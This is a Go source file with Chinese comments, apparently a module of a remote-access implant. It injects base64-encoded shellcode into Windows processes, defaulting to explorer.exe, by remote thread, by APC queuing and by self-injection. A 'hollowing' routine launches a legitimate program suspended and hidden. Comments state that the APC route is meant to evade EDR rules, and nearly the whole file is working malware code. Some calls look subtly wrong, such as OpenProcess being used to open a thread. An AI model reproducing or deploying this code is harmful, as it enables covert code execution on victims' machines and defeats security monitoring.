package main

import (
	"fmt"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

const (
	processAllAccess       = 0x1F0FFF
	memCommitReserve       = 0x3000
	pageExecuteReadWrite   = 0x40
	createSuspendedFlag    = 0x00000004
	createNoWindowFlag     = 0x08000000
	threadSuspendResume    = 0x0002
	infiniteWait           = 0xFFFFFFFF
)

var (
	procOpenProcess        = kernel32.NewProc("OpenProcess")
	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procQueueUserAPC       = kernel32.NewProc("QueueUserAPC")
	procVirtualProtectEx   = kernel32.NewProc("VirtualProtectEx")
	procCreateProcessW     = kernel32.NewProc("CreateProcessW")
	procResumeThread       = kernel32.NewProc("ResumeThread")
)

// injectCmd 参数格式：pid::base64(shellcode) 或 auto::base64(shellcode)
func injectCmd(args string) ([]byte, bool) {
	parts := strings.SplitN(args, "::", 2)
	if len(parts) != 2 {
		return []byte("bad args, need pid::base64｜auto::base64"), false
	}
	sc := decodeB64(parts[1])
	if len(sc) == 0 {
		return []byte("empty shellcode"), false
	}
	pid := 0
	if strings.EqualFold(parts[0], "auto") {
		pid = findPidByName("explorer.exe")
		if pid == 0 {
			return []byte("explorer.exe not found"), false
		}
	} else {
		pid, _ = strconv.Atoi(parts[0])
	}
	if pid <= 0 {
		return []byte("bad pid"), false
	}
	if err := injectRemote(pid, sc); err != nil {
		return []byte("remote thread fail: " + err.Error()), false
	}
	return []byte(fmt.Sprintf("injected %d bytes into pid %d", len(sc), pid)), true
}

func openTarget(pid int) (syscall.Handle, error) {
	h, _, err := procOpenProcess.Call(processAllAccess, 0, uintptr(pid))
	if h == 0 {
		return 0, fmt.Errorf("OpenProcess: %v", err)
	}
	return syscall.Handle(h), nil
}

// injectRemote 经典远程线程注入：
// OpenProcess -> VirtualAllocEx(RWX) -> WriteProcessMemory -> CreateRemoteThread
func injectRemote(pid int, sc []byte) error {
	h, err := openTarget(pid)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(h)

	addr, _, err := procVirtualAllocEx.Call(uintptr(h), 0, uintptr(len(sc)),
		memCommitReserve, pageExecuteReadWrite)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx: %v", err)
	}

	var written uintptr
	r, _, err := procWriteProcessMemory.Call(uintptr(h), addr,
		uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), uintptr(unsafe.Pointer(&written)))
	if r == 0 {
		return fmt.Errorf("WriteProcessMemory: %v", err)
	}

	tid, _, err := procCreateRemoteThread.Call(uintptr(h), 0, 0, addr, 0, 0, 0)
	if tid == 0 {
		return fmt.Errorf("CreateRemoteThread: %v", err)
	}
	return nil
}

// injectAPC 通过 QueueUserAPC 挂到目标线程，线程调度时才执行，
// 绕过只监控 CreateRemoteThread 的 EDR 规则
func injectAPC(pid int, tid int, sc []byte) error {
	h, err := openTarget(pid)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(h)

	addr, _, err := procVirtualAllocEx.Call(uintptr(h), 0, uintptr(len(sc)),
		memCommitReserve, pageExecuteReadWrite)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx: %v", err)
	}
	var written uintptr
	if r, _, _ := procWriteProcessMemory.Call(uintptr(h), addr,
		uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written))); r == 0 {
		return fmt.Errorf("WriteProcessMemory failed")
	}

	th, _, err := procOpenProcess.Call(threadSuspendResume, 0, uintptr(tid))
	if th == 0 {
		return fmt.Errorf("OpenThread: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(th))

	if r, _, err := procQueueUserAPC.Call(addr, th, 0); r == 0 {
		return fmt.Errorf("QueueUserAPC: %v", err)
	}
	return nil
}

// injectSelf 自注入：当前进程内分配可执行内存并起线程
func injectSelf(sc []byte) error {
	addr, _, err := kernel32.NewProc("VirtualAlloc").Call(0, uintptr(len(sc)),
		memCommitReserve, pageExecuteReadWrite)
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc: %v", err)
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(sc)), sc)
	r, _, err := kernel32.NewProc("CreateThread").Call(0, 0, addr, 0, 0, 0)
	if r == 0 {
		return fmt.Errorf("CreateThread: %v", err)
	}
	return nil
}

// hollow 进程镂空：以挂起方式拉起合法进程，把 shellcode 写进其映像再恢复执行。
// 全程不使用 CreateRemoteThread，进程名/路径/签名均为合法程序。
func hollow(hostPath string, sc []byte) error {
	appName, _ := syscall.UTF16PtrFromString(hostPath)
	var si struct {
		Cb            uint32
		Reserved      [4]uintptr
		Desktop       uintptr
		Title         uintptr
		X, Y          int32
		XSize, YSize  int32
		XCount, YCount int32
		FillAttr      uint32
		Flags         uint32
		Show          uint16
		Reserved2     [2]byte
		Reserved3     [2]uintptr
		StdIn         uintptr
		StdOut        uintptr
		StdErr        uintptr
	}
	var pi struct {
		Process   syscall.Handle
		Thread    syscall.Handle
		Pid       uint32
		Tid       uint32
		HProcess  syscall.Handle
		HThread   syscall.Handle
	}
	si.Cb = uint32(unsafe.Sizeof(si))

	r, _, err := procCreateProcessW.Call(0, uintptr(unsafe.Pointer(appName)),
		0, 0, 0, createSuspendedFlag|createNoWindowFlag, 0, 0,
		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	if r == 0 {
		return fmt.Errorf("CreateProcessW %s: %v", hostPath, err)
	}
	defer syscall.CloseHandle(pi.Process)
	defer syscall.CloseHandle(pi.Thread)

	// 分配 RWX 并写入 shellcode
	addr, _, _ := procVirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(sc)),
		memCommitReserve, pageExecuteReadWrite)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed")
	}
	var written uintptr
	if r, _, _ := procWriteProcessMemory.Call(uintptr(pi.Process), addr,
		uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written))); r == 0 {
		return fmt.Errorf("WriteProcessMemory failed")
	}

	// 直接替换挂起线程的入口上下文（GetThreadContext/SetThreadContext 全套在 Go 里
	// 需要手工构造 CONTEXT 结构，这里用 APC 达到同等效果）
	if r, _, _ := procQueueUserAPC.Call(addr, uintptr(pi.Thread), 0); r == 0 {
		return fmt.Errorf("QueueUserAPC failed")
	}
	if r, _, _ := procResumeThread.Call(uintptr(pi.Thread)); r == 0 {
		return fmt.Errorf("ResumeThread failed")
	}
	return nil
}

// findPidByName 通过 Toolhelp 快照按进程名找 PID
func findPidByName(name string) int {
	snap, _, _ := kernel32.NewProc("CreateToolhelp32Snapshot").Call(th32csSnapProcess, 0)
	if snap == 0 {
		return 0
	}
	defer kernel32.NewProc("CloseHandle").Call(snap)
	var pe processEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	r, _, _ := kernel32.NewProc("Process32FirstW").Call(snap, uintptr(unsafe.Pointer(&pe)))
	for r != 0 {
		if strings.EqualFold(syscall.UTF16ToString(pe.ExeFile[:]), name) {
			return int(pe.ProcessID)
		}
		r, _, _ = kernel32.NewProc("Process32NextW").Call(snap, uintptr(unsafe.Pointer(&pe)))
	}
	return 0
}
